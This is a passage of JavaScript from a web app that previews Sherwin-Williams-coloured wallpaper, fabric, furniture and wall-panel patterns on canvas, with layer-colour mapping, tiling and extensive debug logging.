                    data[i + 1] = gLayer;
                    data[i + 2] = bLayer;
                    data[i + 3] = 255;
                    recoloredPixels++;
                } else {
                    data[i + 3] = 0;
                    maskedPixels++;
                }
            }

            console.log(`Recolored pixels: ${recoloredPixels}, Transparent (masked): ${maskedPixels}`);
        }

        console.log(""Processed Sample (R,G,B,A):"", data[0], data[1], data[2], data[3]);
        ctx.putImageData(imageData, 0, 0);
        callback(canvas);
    };

    img.onerror = () => console.error(`Canvas image load failed: ${url}`);
};
   // GUARD / TRACE WRAPPER
    if (USE_GUARD && DEBUG_TRACE) {
    processImage = guard(traceWrapper(processImage, ""processImage"")); // Wrapped for debugging
    } else if (USE_GUARD) {
        processImage = guard(processImage, ""processImage""); // Wrapped for debugging
    }


    // Load pattern data from JSON
function loadPatternData(collection, patternId) {
    console.log(`loadPatternData: patternId=${patternId}`);
    
    const pattern = collection.patterns.find(p => p.id === patternId);
        
    if (pattern) {
        console.log(`✅ Found pattern ""${pattern.name}"" (ID: ${pattern.id}) in collection ""${collection.name}""`);
        appState.currentPattern = pattern;

        // ===== INSERT DEBUG LOGS HERE =====
        console.log(""🔍 SOURCE DATA DEBUG:"");
        console.log(""  Current pattern:"", appState.currentPattern?.name);
        console.log(""  Designer colors:"", appState.currentPattern?.designer_colors);
        console.log(""  Layer labels:"", appState.currentPattern?.layerLabels);
        console.log(""  Layers array:"", appState.currentPattern?.layers?.map((l, i) => `${i}: ${l.path?.split('/').pop()}`));

        // Check if this is a furniture collection
        const isFurnitureCollection = appState.selectedCollection?.wallMask != null || 
                                        appState.selectedCollection?.furnitureType != null;
        
        if (isFurnitureCollection) {
            appState.furnitureMode = true;
        }

        // ✅ Build layer + input models once pattern is set
        populateLayerInputs(pattern);
        

        // ===== DEBUG AFTER populateLayerInputs =====
        console.log(""🎛️ UI POPULATION DEBUG:"");
        console.log(""  currentLayers count:"", appState.currentLayers?.length);
        console.log(""  currentLayers content:"");
        appState.currentLayers?.forEach((layer, index) => {
            console.log(`    ${index}: ""${layer.label}"" = ""${layer.color}""`);
        });

        // ===== DEBUG ACTUAL DOM INPUTS =====
        setTimeout(() => {
            console.log(""🔍 ACTUAL UI INPUTS:"");
            const inputs = document.querySelectorAll('.layer-input');
            inputs.forEach((input, index) => {
                const container = input.closest('.layer-input-container');
                const label = container?.querySelector('.layer-label')?.textContent;
                console.log(`    UI Input ${index}: ""${label}"" = ""${input.value}""`);
            });
        }, 100); // Small delay to ensure DOM is updated

        console.log("">>> Updated appState.currentPattern:"", JSON.stringify(pattern, null, 2));
        appState.curatedColors = appState.selectedCollection.curatedColors || [];
        console.log("">>> Updated appState.curatedColors:"", appState.curatedColors);
        
        if (!Array.isArray(appState.colorsData) || appState.colorsData.length === 0) {
            console.warn(""🛑 Sherwin-Williams colors not loaded yet. Delaying populateCuratedColors."");
            return;
        }

        // ✅ Only call curated color population when everything is ready
        if (appState.colorsData.length && collection.curatedColors?.length) {
            appState.curatedColors = collection.curatedColors;
            populateCuratedColors(appState.curatedColors);
        } else {
            console.warn(""X Not populating curated colors - missing data"");
        }

        const isFurniturePattern = appState.currentPattern?.isFurniture || false;
        
        updatePreview();
        
        // Check if we're in fabric mode - if so, only render fabric mockup
        if (appState.isInFabricMode) {
            console.log(""🧵 loadPatternData in fabric mode - calling renderFabricMockup()"");
            renderFabricMockup();
        } else {
            updateRoomMockup();
        }
        
        populatePatternThumbnails(appState.selectedCollection.patterns);
        populateCoordinates();

    } else {
        console.error("">>> Pattern not found:"", patternId);
    }
}
    // GUARD / TRACE WRAPPER
    if (USE_GUARD && DEBUG_TRACE) {
    loadPatternData = guard(traceWrapper(loadPatternData, ""loadPatternData"")); // Wrapped for debugging
    } else if (USE_GUARD) {
        loadPatternData = guard(loadPatternData, ""loadPatternData""); // Wrapped for debugging
    }

    // Pattern scaling
    window.setPatternScale = function(multiplier) {
        appState.scaleMultiplier = multiplier;
        console.log(`>>> Scale multiplier set to: ${appState.scaleMultiplier}`);

        // Highlight active button
        document.querySelectorAll('#scaleControls button').forEach(btn => {
            const btnMultiplier = parseFloat(btn.dataset.multiplier);
            if (btnMultiplier === multiplier) {
                btn.classList.add('!bg-blue-500', 'text-white', 'active-scale');
                btn.classList.remove('!bg-gray-200');
            } else {
                btn.classList.add('!bg-gray-200');
                btn.classList.remove('!bg-blue-500', 'text-white', 'active-scale');
            }
        });

        // Check if we're in fabric mode - if so, only render fabric mockup
        if (appState.isInFabricMode) {
            console.log(""🧵 setPatternScale in fabric mode - calling renderFabricMockup()"");
            renderFabricMockup();
        } else {
            updateRoomMockup();
        }

        const isFurniturePattern = appState.currentPattern?.isFurniture || false;

        updatePreview();
        
    };
    // GUARD / TRACE WRAPPER
    if (USE_GUARD && DEBUG_TRACE) {
    setPatternScale = guard(traceWrapper(setPatternScale, ""setPatternScale"")); // Wrapped for debugging
    } else if (USE_GUARD) {
        setPatternScale = guard(setPatternScale, ""setPatternScale""); // Wrapped for debugging
    }
    
    // Initialize scale on page load
    document.addEventListener('DOMContentLoaded', () => {
        appState.scaleMultiplier = 1; // Default to Normal
        setPatternScale(1);
        console.log('setPatternScale called with multiplier:', appState.scaleMultiplier);
    });


    // Ensure updatePreview is defined before updateDisplays uses it
// ============================================================================
// CORE ISSUES AND FIXES
// ============================================================================

// 1. Fix buildLayerModel to return a flat array consistently
function buildLayerModel(pattern, designerColors = [], options = {}) {
    const { isWallPanel = false, tintWhite = false } = options;
    const patternLayers = pattern.layers || [];
    const layerLabels = pattern.layerLabels || [];

    console.log(""🏗️ buildLayerModel LABEL FIX DEBUG:"");
    console.log(""  Pattern layers:"", patternLayers.length);
    console.log(""  Layer labels:"", layerLabels);
    console.log(""  Designer colors available:"", designerColors.length);

    let colorIndex = 0;
    let inputIndex = 0;
    const allLayers = [];

    // Check if this is a furniture collection
console.log(""🔍 FURNITURE DETECTION DEBUG:"");
console.log(""  selectedCollection name:"", appState.selectedCollection?.name);
console.log(""  selectedCollection wallMask:"", appState.selectedCollection?.wallMask);
console.log(""  selectedCollection furnitureType:"", appState.selectedCollection?.furnitureType);
console.log(""  selectedCollection keys:"", Object.keys(appState.selectedCollection || {}));

const isFurnitureCollection = appState.selectedCollection?.wallMask != null;
console.log(""  isFurnitureCollection result:"", isFurnitureCollection);
    

    if (isFurnitureCollection) {
        // Add wall color layer
        const furnitureConfig = appState.selectedCollection?.furnitureConfig;
        const defaultWallColor = furnitureConfig?.defaultWallColor || ""SW7006 Extra White"";
        
        allLayers.push({
            label: ""Wall Color"",
            color: defaultWallColor,
            path: null,
            isBackground: false,
            isShadow: false,
            isWallPanel: false,
            inputId: `layer-${inputIndex++}`
        });
        console.log(`  ✅ Added Wall Color (default): ${defaultWallColor}`);

        // Add sofa base layer  
        allLayers.push({
            label: ""BG/Sofa Base"",
            color: designerColors[colorIndex++] || ""Snowbound"", 
            path: null,
            isBackground: true,
            isShadow: false,
            isWallPanel: false,
            inputId: `layer-${inputIndex++}`
        });
        console.log(`  ✅ Added BG/Sofa Base (designer color ${colorIndex - 1})`);

    } else {
        // Standard collection - just background
        allLayers.push({
            label: ""Background"",
            color: designerColors[colorIndex++] || ""Snowbound"", 
            path: null,
            isBackground: true,
            isShadow: false,
            isWallPanel: false,
            inputId: `layer-${inputIndex++}`
        });
    }

    // ✅ PATTERN LAYERS (shared by both furniture and standard)
    console.log(""  🎨 Processing pattern layers:"");
    let patternLabelIndex = 0;

    for (let i = 0; i < patternLayers.length; i++) {
        const layer = patternLayers[i];
        const isTrueShadow = layer.isShadow === true;

        if (!isTrueShadow) {
            const originalLabel = layerLabels[patternLabelIndex] || `Pattern Layer ${patternLabelIndex + 1}`;
            
            const layerObj = {
                label: originalLabel,
                color: designerColors[colorIndex++] || ""Snowbound"",
                path: layer.path || """",
                isBackground: false,
                isShadow: false,
                isWallPanel: false,
                tintWhite,
                inputId: `layer-${inputIndex++}`,
                patternLayerIndex: i
            };

            allLayers.push(layerObj);
            console.log(`    ✅ Added pattern layer: ""${originalLabel}"" (designer color ${colorIndex - 1})`);
            patternLabelIndex++;
        
    } else {
            // Shadow layers (no input needed)
            const layerObj = {
                label: `Shadow ${i + 1}`,
                color: null,
                path: layer.path || """",
                isBackground: false,
                isShadow: true,
                isWallPanel: false,
                tintWhite,
                inputId: null,
                patternLayerIndex: i
            };

            allLayers.push(layerObj);
            console.log(`    ✅ Added shadow layer: ""Shadow ${i + 1}"" (no color index used)`);
        }
    }

    console.log(`🏗️ Final layer model (used ${colorIndex} designer colors):`);
    allLayers.forEach((layer, index) => {
        const type = layer.isBackground ? 'bg' : layer.isShadow ? 'shadow' : 'layer';
        console.log(`  ${index}: ${layer.label} (${type}) = ${layer.color || 'no color'}`);
    });

    // VALIDATION: Check counts
    const inputLayers = allLayers.filter(l => !l.isShadow);
    console.log(`✅ Created ${inputLayers.length} input layers, used ${colorIndex} designer colors`);
    
    if (designerColors.length < colorIndex) {
        console.warn(`⚠️ Not enough designer colors: need ${colorIndex}, have ${designerColors.length}`);
    }

    // Add this at the very end of buildLayerModel(), just before the return statement
console.log(`🏗️ FINAL LAYER MODEL DEBUG:`);
console.log(`  Total layers created: ${allLayers.length}`);
console.log(`  isFurnitureCollection was: ${isFurnitureCollection}`);
console.log(`  Used ${colorIndex} designer colors`);
console.log(`  Final layer structure:`);
allLayers.forEach((layer, index) => {
    const type = layer.isBackground ? 'bg' : layer.isShadow ? 'shadow' : 'input';
    console.log(`    ${index}: ""${layer.label}"" (${type}) = ""${layer.color}"" | inputId: ${layer.inputId}`);
});


    return allLayers;
}





// ✅ Wrap in an IIFE to avoid illegal top-level return
if (appState.currentPattern) {
(() => {
  try {
    const pattern = appState.currentPattern;

    if (!pattern || !Array.isArray(pattern.layers)) {
      console.error(""❌ Invalid pattern or missing layers:"", pattern);
      return;
    }

    const designerColors = pattern.designer_colors || [];

    appState.currentLayers = buildLayerModel(
      pattern,
      designerColors,
      {
        isWallPanel: appState.selectedCollection?.name === ""wall-panels"",
        tintWhite: appState.tintWhite || false
      }
    );

    appState.layerInputs = appState.currentLayers.map(layer => {
      const layerData = createColorInput(
        layer.label,
        layer.inputId,
        layer.color,
        layer.isBackground
      );
      return {
        ...layerData,
        color: layer.color,
        hex: lookupColor(layer.color) || ""#FFFFFF""
      };
    });

  } catch (e) {
    console.error(""❌ Error populating layer inputs:"", e);
  }
})();
}


// 2. updatePreview
let updatePreview = async () => {

            console.log(""🔍 updatePreview PATTERN DEBUG:"");
        console.log(""  currentPattern name:"", appState.currentPattern?.name);
        console.log(""  currentPattern layers:"", appState.currentPattern?.layers?.map(l => l.path?.split('/').pop()));
        console.log(""  isFurnitureMode:"", appState.furnitureMode);
        console.log(""  selectedCollection name:"", appState.selectedCollection?.name);
        
        if (!dom.preview) return console.error(""preview not found in DOM"");


    try {
        if (!dom.preview) return console.error(""preview not found in DOM"");
        if (!appState.currentPattern) return console.error(""No current pattern selected"");

        console.log(""🔍 updatePreview START"");

        // Get responsive canvas size from CSS custom properties
        const computedStyle = getComputedStyle(document.documentElement);
        const canvasSize = parseInt(computedStyle.getPropertyValue('--preview-size').replace('px', '')) || 700;
        console.log(""📱 Canvas size from CSS:"", canvasSize);

        const previewCanvas = document.createElement(""canvas"");
        const previewCtx = previewCanvas.getContext(""2d"", { willReadFrequently: true });
        previewCanvas.width = canvasSize;
        previewCanvas.height = canvasSize;

        // Check if this is a furniture collection
        const isFurnitureCollection = appState.selectedCollection?.wallMask != null;
        const layerMapping = getLayerMappingForPreview(isFurnitureCollection);
        console.log(""🔍 SOFA BASE DEBUG:"");
        console.log(""  Layer mapping:"", layerMapping);
        console.log(""  backgroundIndex:"", layerMapping.backgroundIndex);
        console.log(""  Current layers length:"", appState.currentLayers.length);

        


        
        console.log(""🔍 Layer mapping:"", layerMapping);
        console.log(""🔍 Current layers:"", appState.currentLayers.map((l, i) => `${i}: ${l.label} = ${l.color}`));

        let patternToRender = appState.currentPattern;
        let usesBotanicalLayers = false;

        // For furniture collections, try to find the botanical pattern
        if (isFurnitureCollection) {
            console.log(""🌿 Furniture mode detected - looking for original pattern"");
            
            // Try multiple ways to get the original pattern
            let originalPattern = null;
            
            // Method 1: Check if furniture pattern stores original
            if (appState.currentPattern.originalPattern) {
                originalPattern = appState.currentPattern.originalPattern;
                console.log(""✅ Found original pattern via .originalPattern"");
            }
            
            // Method 2: Look up by name in botanicals collection
            if (!originalPattern) {
                const botanicalCollection = appState.collections.find(c => c.name === ""botanicals"");
                if (botanicalCollection) {
                    // Remove any furniture prefixes from the name to find botanical pattern
                    const cleanPatternName = appState.currentPattern.name
                        .replace(/^.*\s+/, '') // Remove collection prefix
                        .replace(/\s+\w+\s+sofa$/i, ''); // Remove furniture suffix
                    
                    originalPattern = botanicalCollection.patterns.find(p => 
                        p.name.toLowerCase() === cleanPatternName.toLowerCase() ||
                        p.name.toLowerCase() === appState.currentPattern.name.toLowerCase()
                    );
                    
                    if (originalPattern) {
                        console.log(""✅ Found original pattern by name lookup:"", originalPattern.name);
                    }
                }
            }
            
            // Method 3: Use stored original collection
            if (!originalPattern && appState.originalCollection) {
                originalPattern = appState.originalCollection.patterns?.find(p => 
                    p.id === appState.currentPattern.id
                );
                
                if (originalPattern) {
                    console.log(""✅ Found original pattern via originalCollection"");
                }
            }
            
            if (originalPattern) {
                console.log(""🌿 Using original pattern for preview:"", originalPattern.name);
                console.log(""  Original layers:"", originalPattern.layers?.map(l => l.path.split('/').pop()));
                
                patternToRender = originalPattern;
                usesBotanicalLayers = true;
            } else {
                console.warn(""⚠️ Could not find original pattern, using furniture pattern"");
            }
        }


        // Get background color based on collection type
        let backgroundLayerIndex = layerMapping.backgroundIndex;
        let backgroundColor;

        if (isFurnitureCollection && usesBotanicalLayers) {
            // ✅ FIX: For furniture mode pattern preview, use the BG/Sofa Base color (index 1)
            // but this should be the same as the original background color
            backgroundColor = lookupColor(appState.currentLayers[1]?.color || ""Snowbound"");
            console.log(`🌿 Furniture mode pattern preview - using BG/Sofa Base color from input 1: ${backgroundColor}`);
        } else {
            // Standard mode or furniture room mockup
            const backgroundLayer = appState.currentLayers[backgroundLayerIndex];
            backgroundColor = lookupColor(backgroundLayer?.color || ""Snowbound"");
            console.log(`🎨 Standard background color from input ${backgroundLayerIndex}: ${backgroundColor}`);
        }        
        console.log(`🎨 Background color from input ${backgroundLayerIndex}: ${backgroundColor}`);

        // Clear canvas to transparent
        previewCtx.clearRect(0, 0, previewCanvas.width, previewCanvas.height);

        // Handle tint white patterns
        if (patternToRender.tintWhite && patternToRender.baseComposite) {
            console.log(""🎨 Rendering tint white pattern"");
            
            const baseImage = new Image();
            baseImage.crossOrigin = ""Anonymous"";
            baseImage.src = normalizePath(patternToRender.baseComposite);
            
            await new Promise((resolve, reject) => {
                baseImage.onload = () => {
                    const scaleMultiplier = appState.scaleMultiplier || 1;
                    const imgAspect = baseImage.width / baseImage.height;
                    const maxSize = canvasSize * scaleMultiplier;
                    
                    let drawWidth, drawHeight, offsetX, offsetY;
                    if (imgAspect > 1) {
                        drawWidth = Math.min(maxSize, canvasSize);
                        drawHeight = drawWidth / imgAspect;
                    } else {
                        drawHeight = Math.min(maxSize, canvasSize);
                        drawWidth = drawHeight * imgAspect;
                    }
                    
                    offsetX = (canvasSize - drawWidth) / 2;
                    offsetY = (canvasSize - drawHeight) / 2;
                    
                    previewCtx.fillStyle = backgroundColor;
                    previewCtx.fillRect(offsetX, offsetY, drawWidth, drawHeight);
                    previewCtx.drawImage(baseImage, offsetX, offsetY, drawWidth, drawHeight);
                    
                    // Apply tint to white areas
                    let imageData;
                    try {
                        imageData = previewCtx.getImageData(offsetX, offsetY, drawWidth, drawHeight);
                    } catch (e) {
                        console.warn(""⚠️ Canvas tainted, skipping preview tinting:"", e.message);
                        resolve();
                        return;
                    }
                    const data = imageData.data;
                    const wallColor = lookupColor(appState.currentLayers[0]?.color || ""Snowbound"");
                    const hex = wallColor.replace(""#"", """");
                    const rTint = parseInt(hex.substring(0, 2), 16);
                    const gTint = parseInt(hex.substring(2, 4), 16);
                    const bTint = parseInt(hex.substring(4, 6), 16);
                    
                    for (let i = 0; i < data.length; i += 4) {
                        const r = data[i], g = data[i + 1], b = data[i + 2];
                        if (r > 240 && g > 240 && b > 240) {
                            data[i] = rTint;
                            data[i + 1] = gTint;
                            data[i + 2] = bTint;
                        }
                    }
                    
                    previewCtx.putImageData(imageData, offsetX, offsetY);
                    resolve();
                };
                baseImage.onerror = reject;
            });
            
        } else if (patternToRender.layers?.length) {
            console.log(""🎨 Rendering layered pattern"");
            console.log(""  Uses botanical layers:"", usesBotanicalLayers);
            
            const firstLayer = patternToRender.layers.find(l => !l.isShadow);
            if (firstLayer) {
                const tempImg = new Image();
                tempImg.crossOrigin = ""Anonymous"";
                tempImg.src = normalizePath(firstLayer.path);
                
                await new Promise((resolve) => {
                    tempImg.onload = () => {
                        const patternAspect = tempImg.width / tempImg.height;
                        const scaleMultiplier = appState.scaleMultiplier || 1;
                        
                        let patternDisplayWidth, patternDisplayHeight;
                        const baseSize = canvasSize;
                        
                        if (patternAspect > 1) {
                            patternDisplayWidth = Math.min(baseSize, canvasSize);
                            patternDisplayHeight = patternDisplayWidth / patternAspect;
                        } else {
                            patternDisplayHeight = Math.min(baseSize, canvasSize);
                            patternDisplayWidth = patternDisplayHeight * patternAspect;
                        }
                        
                        const offsetX = (canvasSize - patternDisplayWidth) / 2;
                        const offsetY = (canvasSize - patternDisplayHeight) / 2;
                        
                        previewCtx.fillStyle = backgroundColor;
                        previewCtx.fillRect(offsetX, offsetY, patternDisplayWidth, patternDisplayHeight);
                        
                        console.log(`🎨 Pattern area: ${patternDisplayWidth.toFixed(0)}x${patternDisplayHeight.toFixed(0)}`);
                        
                        resolve({ offsetX, offsetY, patternDisplayWidth, patternDisplayHeight, scaleMultiplier });
                    };
                    tempImg.onerror = () => resolve(null);
                }).then(async (patternBounds) => {
                    if (!patternBounds) return;
                    
                    // Render each layer with correct color mapping
                    for (let layerIndex = 0; layerIndex < patternToRender.layers.length; layerIndex++) {
                        const layer = patternToRender.layers[layerIndex];
                        const isShadow = layer.isShadow === true;
                        
                        let layerColor = null;
                        if (!isShadow) {
                            if (usesBotanicalLayers) {
    // ✅ FIX: Map botanical layer to furniture input correctly
    const furnitureInputIndex = layerMapping.patternStartIndex + layerIndex;
    layerColor = lookupColor(appState.currentLayers[furnitureInputIndex]?.color || ""Snowbound"");
    
    // ✅ DEBUG: Show the mapping
    const inputLayer = appState.currentLayers[furnitureInputIndex];
    console.log(`🌿 Botanical layer ${layerIndex} → furniture input ${furnitureInputIndex} (${inputLayer?.label}) → ${layerColor}`);

                            } else {
                                // Standard mapping
                                const inputIndex = layerMapping.patternStartIndex + layerIndex;
                                layerColor = lookupColor(appState.currentLayers[inputIndex]?.color || ""Snowbound"");
                                console.log(`🏠 Standard layer ${layerIndex} → input ${inputIndex} → ${layerColor}`);
                            }
                        }

                        await new Promise((resolve) => {
                            processImage(layer.path, (processedCanvas) => {
                                if (!(processedCanvas instanceof HTMLCanvasElement)) {
                                    return resolve();
                                }

                                const patternSize = Math.max(processedCanvas.width, processedCanvas.height);
                                const baseScale = patternBounds.patternDisplayWidth / patternSize;
                                const finalScale = baseScale * patternBounds.scaleMultiplier;
                                const tileWidth = processedCanvas.width * finalScale;
                                const tileHeight = processedCanvas.height * finalScale;

                                const tilingType = patternToRender.tilingType || """";
                                const isHalfDrop = tilingType === ""half-drop"";

                                previewCtx.save();
                                previewCtx.beginPath();
                                previewCtx.rect(
                                    patternBounds.offsetX, 
                                    patternBounds.offsetY, 
                                    patternBounds.patternDisplayWidth, 
                                    patternBounds.patternDisplayHeight
                                );
                                previewCtx.clip();

                                previewCtx.globalCompositeOperation = isShadow ? ""multiply"" : ""source-over"";
                                previewCtx.globalAlpha = isShadow ? 0.3 : 1.0;
                                
                                const startX = patternBounds.offsetX;
                                const startY = patternBounds.offsetY;
                                const endX = patternBounds.offsetX + patternBounds.patternDisplayWidth + tileWidth;
                                const endY = patternBounds.offsetY + patternBounds.patternDisplayHeight + tileHeight;
                                
                                for (let x = startX; x < endX; x += tileWidth) {
                                    const isOddColumn = Math.floor((x - startX) / tileWidth) % 2 !== 0;
                                    const yOffset = isHalfDrop && isOddColumn ? tileHeight / 2 : 0;
                                    
                                    for (let y = startY - tileHeight + yOffset; y < endY; y += tileHeight) {
                                        previewCtx.drawImage(processedCanvas, x, y, tileWidth, tileHeight);
                                    }
                                }
                                
                                previewCtx.restore();
                                console.log(`✅ Rendered layer ${layerIndex} with color ${layerColor}`);
                                resolve();
                            }, layerColor, 2.2, isShadow, false, false);
                        });
                    }
                });
            }
        }

        // Update DOM
        dom.preview.innerHTML = """";
        dom.preview.appendChild(previewCanvas);
        dom.preview.style.width = `${canvasSize}px`;
        dom.preview.style.height = `${canvasSize}px`;
        dom.preview.style.backgroundColor = ""rgba(17, 24, 39, 1)"";

        if (patternToRender.name) {
            dom.patternName.textContent = toInitialCaps(appState.currentPattern.name); // Keep original name
        }
        
        console.log(""✅ Pattern preview rendered"");
        
    } catch (err) {
        console.error(""updatePreview error:"", err);
    }
};



// Utility: Promisified image loader
function loadImage(src) {
    return new Promise((resolve, reject) => {
        if (!src) {
            console.error(""❌ loadImage: No src provided"");
            reject(new Error(""No image source provided""));
            return;
        }
        
        // Normalize the path to fix ./data/ vs data/ inconsistencies
        const normalizedSrc = normalizePath(src);
        console.log(`📥 Loading image: ${src} -> ${normalizedSrc}`);
        const img = new Image();
        img.crossOrigin = ""Anonymous"";
        
        img.onload = () => {
            console.log(`✅ Image loaded successfully: ${normalizedSrc} (${img.naturalWidth}x${img.naturalHeight})`);
            resolve(img);
        };
        
        img.onerror = (error) => {
            console.error(`❌ Failed to load image: ${normalizedSrc}`);
            console.error(""❌ Error details:"", error);
            reject(new Error(`Failed to load image: ${normalizedSrc}`));
        };
        
        img.src = normalizedSrc;
    });
}

    
//  room mockup
let updateRoomMockup = async () => {
    try {
        if (!dom.roomMockup) {
            console.error(""roomMockup element not found in DOM"");
            return;
        }

        if (!appState.selectedCollection || !appState.currentPattern) {
            console.log(""🔍 Skipping updateRoomMockup - no collection/pattern selected"");
            return;
        }

        // Check if this is a furniture collection
        const isFurnitureCollection = appState.selectedCollection.wallMask != null;
        
        if (isFurnitureCollection) {
        console.log(""🪑 Rendering furniture preview"");
        updateFurniturePreview();
        return;
        }



        const isWallPanel = appState.selectedCollection?.name === ""wall-panels"";

        // 🔍 ADD THIS DEBUG HERE:
        console.log(""🔍 CURRENT LAYERS MAPPING (Room Mockup):"");
        appState.currentLayers.forEach((layer, index) => {
            console.log(`  ${index}: ${layer.label} = ${layer.color} (isShadow: ${layer.isShadow})`);
        });


        // 🔍 DEBUG: Check what path we're taking
        console.log(""🔍 DEBUG START updateRoomMockup"");
        console.log(""🔍 isWallPanel:"", isWallPanel);
        console.log(""🔍 selectedCollection name:"", appState.selectedCollection?.name);
        console.log(""🔍 currentPattern.isWallPanel:"", appState.currentPattern?.isWallPanel);
        console.log(""🔍 currentPattern has layers:"", !!appState.currentPattern?.layers?.length);
        console.log(""🔍 currentPattern has tintWhite:"", !!appState.currentPattern?.tintWhite);

        
        // Get colors from correct layer indices
        const wallColor = isWallPanel ? 
            lookupColor(appState.currentLayers[0]?.color || ""Snowbound"") : 
            lookupColor(appState.currentLayers[0]?.color || ""Snowbound"");
        const backgroundColor = isWallPanel ? 
            lookupColor(appState.currentLayers[1]?.color || ""Snowbound"") :
            lookupColor(appState.currentLayers[0]?.color || ""Snowbound"");
        
        console.log("">>> Wall color:"", wallColor, ""Background color:"", backgroundColor);

        const canvas = document.createElement(""canvas"");
        const ctx = canvas.getContext(""2d"");
        canvas.width = 600;
        canvas.height = 450;
        console.log(`🎨 Room mockup canvas created: ${canvas.width}x${canvas.height}`);

        const processOverlay = async () => {
            console.log(""🔍 processOverlay() START"");
            // Fill wall color
            ctx.fillStyle = wallColor;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            console.log(""🔍 Wall color filled"");

            if (isWallPanel && appState.currentPattern?.layers?.length) {
                    console.log(""🔍 TAKING PATH: Wall panel processing"");

                // Handle wall panel rendering
                const panelWidthInches = appState.currentPattern.size[0] || 24;
                const panelHeightInches = appState.currentPattern.size[1] || 36;
                const scale = Math.min(canvas.width / 100, canvas.height / 80) * (appState.scaleMultiplier || 1);
                
                const panelWidth = panelWidthInches * scale;
                const panelHeight = panelHeightInches * scale;
                
                const layout = appState.currentPattern.layout || ""3,20"";
                const [numPanelsStr, spacingStr] = layout.split("","");
                const numPanels = parseInt(numPanelsStr, 10) || 3;
                const spacing = parseInt(spacingStr, 10) || 20;
                
                const totalWidth = (numPanels * panelWidth) + ((numPanels - 1) * spacing);
                const startX = (canvas.width - totalWidth) / 2;
                const startY = (canvas.height - panelHeight) / 2 - (appState.currentPattern?.verticalOffset || 50);

                // Create panel canvas
                const panelCanvas = document.createElement(""canvas"");
                panelCanvas.width = panelWidth;
                panelCanvas.height = panelHeight;
                const panelCtx = panelCanvas.getContext(""2d"");

                // Process panel layers - find input layers only
                let currentLayerIndex = 0; // Start from first design layer

                for (let i = 0; i < appState.currentPattern.layers.length; i++) {
                    const layer = appState.currentPattern.layers[i];
                    const isShadow = layer.isShadow === true;
                    
                        console.log(`🔍 LAYER DEBUG ${i}:`, {
                        path: layer.path,
                        isShadow: isShadow,
                        currentLayerIndex: currentLayerIndex,
                        expectedColorIndex: currentLayerIndex + 2
                    });

                    let layerColor = null;
                    if (!isShadow) {
                        // Wall panels: [0: Wall, 1: Background, 2+: Design layers]
                        const colorLayerIndex = currentLayerIndex + 2; // Skip wall (0) and background (1)
                        layerColor = lookupColor(appState.currentLayers[colorLayerIndex]?.color || ""Snowbound"");
                        console.log(`🎨 Regular layer ${i}: using color from currentLayers[${colorLayerIndex}] = ${layerColor}`);
                        currentLayerIndex++;
                    }
                    
                    await new Promise((resolve) => {
                        console.log(`🔍 About to call processImage with: isShadow=${isShadow}, isWallPanel=true, isWall=false`);

                        processImage(layer.path, (processedCanvas) => {
                            if (processedCanvas instanceof HTMLCanvasElement) {
                                panelCtx.globalCompositeOperation = isShadow ? ""multiply"" : ""source-over"";
                                panelCtx.globalAlpha = isShadow ? 0.3 : 1.0;
                                panelCtx.drawImage(processedCanvas, 0, 0, panelWidth, panelHeight);
                            }
                            resolve();
                        }, layerColor, 2.2, isShadow, true, false);
                    });
                }
                    

                // Draw panels
                for (let i = 0; i < numPanels; i++) {
                    const x = startX + (i * (panelWidth + spacing));
                    ctx.fillStyle = backgroundColor;
                    ctx.fillRect(x, startY, panelWidth, panelHeight);
                    ctx.drawImage(panelCanvas, x, startY, panelWidth, panelHeight);
                }
            } else {
                    console.log(""🔍 TAKING PATH: Regular pattern processing"");
                    console.log(""🔍 appState.currentPattern:"", appState.currentPattern);
                    console.log(""🔍 appState.currentPattern.layers:"", appState.currentPattern?.layers);

                // Handle regular pattern rendering
                const patternCanvas = document.createElement(""canvas"");
                patternCanvas.width = canvas.width;
                patternCanvas.height = canvas.height;
                const patternCtx = patternCanvas.getContext(""2d"");
                
                if (appState.currentPattern?.tintWhite && appState.currentPattern?.baseComposite) {
                            console.log(""🔍 TAKING SUBPATH: Tint white"");

                    // Handle tint white in room mockup
                    const baseImage = new Image();
                    baseImage.src = normalizePath(appState.currentPattern.baseComposite);
                    
                    await new Promise((resolve) => {
                        baseImage.onload = () => {
                            const scale = (appState.currentScale / 100 || 1) * (appState.scaleMultiplier || 1);
                            const tileWidth = baseImage.width * scale;
                            const tileHeight = baseImage.height * scale;
                            
                            // Tile pattern
                            for (let x = -tileWidth; x < canvas.width + tileWidth; x += tileWidth) {
                                for (let y = -tileHeight; y < canvas.height + tileHeight; y += tileHeight) {
                                    patternCtx.drawImage(baseImage, x, y, tileWidth, tileHeight);
                                }
                            }
                            
                            // Apply tint (with CORS protection)
                            let imageData;
                            try {
                                imageData = patternCtx.getImageData(0, 0, canvas.width, canvas.height);
                            } catch (e) {
                                console.warn(""⚠️ Canvas tainted, skipping tint white effect:"", e.message);
                                ctx.drawImage(patternCanvas, 0, 0);
                                return;
                            }
                            const data = imageData.data;
                            const hex = wallColor.replace(""#"", """");
                            const rTint = parseInt(hex.substring(0, 2), 16);
                            const gTint = parseInt(hex.substring(2, 4), 16);
                            const bTint = parseInt(hex.substring(4, 6), 16);
                            
                            for (let i = 0; i < data.length; i += 4) {
                                const r = data[i], g = data[i + 1], b = data[i + 2];
                                if (r > 240 && g > 240 && b > 240) {
                                    data[i] = rTint;
                                    data[i + 1] = gTint;
                                    data[i + 2] = bTint;
                                }
                            }
                            
                            patternCtx.putImageData(imageData, 0, 0);
                            ctx.drawImage(patternCanvas, 0, 0);
                            resolve();
                        };
                        baseImage.onerror = resolve;
                    });
                    } else if (appState.currentPattern?.layers?.length && !isWallPanel) {
                                console.log(""🔍 TAKING SUBPATH: Regular layers"");

                    // Handle regular layered patterns - FIXED indexing
                    let currentLayerIndex = 0; // Start from first non-shadow layer
                    
                    const inputLayers = appState.currentLayers.filter(layer => !layer.isShadow);
                    let inputLayerIndex = 0;

                    for (let i = 0; i < appState.currentPattern.layers.length; i++) {
                        const layer = appState.currentPattern.layers[i];
                        const isShadow = layer.isShadow === true;
                        
                        let layerColor = null;
                        if (!isShadow) {
                            const inputLayer = inputLayers[inputLayerIndex + 1]; // Skip background
                            layerColor = lookupColor(inputLayer?.color || ""Snowbound"");
                            inputLayerIndex++; // Increment here
                        }

                    // Check for half-drop tiling (declare once, outside)
                    const tilingType = appState.currentPattern.tilingType || """";
                    const isHalfDrop = tilingType === ""half-drop"";
                    console.log(`🔄 ROOM MOCKUP Tiling type: ${tilingType}, Half-drop: ${isHalfDrop}`);

